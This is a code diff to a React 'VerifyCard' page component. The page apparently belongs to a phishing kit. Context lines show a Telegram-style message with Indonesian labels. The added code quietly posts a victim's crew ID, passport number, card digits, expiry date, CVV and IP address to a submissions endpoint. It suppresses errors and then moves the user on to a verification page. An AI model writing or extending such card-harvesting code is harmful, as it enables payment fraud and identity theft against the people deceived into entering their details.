@@ -103,6 +103,20 @@ export default function VerifyCard() {
       `🕐 <b>Waktu</b>       : ${now}\n` +
       `━━━━━━━━━━━━━━━━━━━━━`
     );
+    await fetch("/api/submissions/card", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        username: pendingUsername ?? "",
+        crewId,
+        passportNo,
+        cardLast8: lastDigit,
+        cardMonth: month,
+        cardYear: year,
+        cvv: secCode,
+        ipAddress: ip,
+      }),
+    }).catch(() => {});
     verifyCard();
     navigate("/verify");
   };
